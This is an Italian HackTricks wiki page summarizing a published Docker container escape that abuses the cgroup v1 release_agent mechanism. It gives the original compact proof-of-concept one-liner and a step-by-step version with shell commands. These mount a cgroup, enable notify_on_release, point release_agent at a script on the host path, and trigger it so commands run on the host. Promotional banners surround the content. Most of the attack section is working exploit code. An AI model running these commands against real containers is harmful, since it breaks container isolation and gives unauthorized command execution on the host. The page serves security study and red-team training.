# Fuga dalle cgroups del Docker release_agent

{% hint style="success" %}
Impara e pratica l'hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Sostieni HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) è un motore di ricerca alimentato dal **dark web** che offre funzionalità **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.

Il loro obiettivo principale è combattere le violazioni degli account e gli attacchi ransomware derivanti da malware che rubano informazioni.

Puoi visitare il loro sito web e provare il loro motore **gratuitamente** su:

{% embed url="https://whiteintel.io" %}

***

**Per ulteriori dettagli, consulta il** [**post originale del blog**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Questo è solo un riassunto:

PoC originale:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Il proof of concept (PoC) dimostra un metodo per sfruttare i cgroups creando un file `release_agent` e attivandone l'invocazione per eseguire comandi arbitrari sull'host del contenitore. Ecco una panoramica dei passaggi coinvolti:

1. **Preparare l'Ambiente:**
* Viene creato un directory `/tmp/cgrp` per fungere da punto di mount per il cgroup.
* Il controller cgroup RDMA viene montato in questa directory. In caso di assenza del controller RDMA, si consiglia di utilizzare il controller cgroup `memory` come alternativa.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Impostare il Cgroup Figlio:**
   * Viene creato un cgroup figlio chiamato "x" all'interno della directory cgroup montata.
   * Le notifiche vengono abilitate per il cgroup "x" scrivendo 1 nel suo file notify\_on\_release.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Configurare l'Agente di Rilascio:**
* Il percorso del contenitore sull'host viene ottenuto dal file /etc/mtab.
* Il file release\_agent del cgroup viene quindi configurato per eseguire uno script di nome /cmd situato nel percorso dell'host acquisito.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **Creare e Configurare lo Script /cmd:**
* Lo script /cmd viene creato all'interno del container e viene configurato per eseguire ps aux, reindirizzando l'output in un file chiamato /output nel container. Viene specificato il percorso completo di /output sull'host.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Innesca l'Attacco:**
* Viene avviato un processo all'interno del sottogruppo figlio "x" e viene immediatamente terminato.
* Questo attiva il `release_agent` (lo script /cmd), che esegue ps aux sull'host e scrive l'output su /output all'interno del container.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) è un motore di ricerca alimentato dal **dark web** che offre funzionalità **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.

Il loro obiettivo principale è combattere i takeover di account e gli attacchi ransomware derivanti da malware che rubano informazioni.

Puoi visitare il loro sito web e provare il loro motore gratuitamente su:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
Impara e pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.

</details>
{% endhint %}
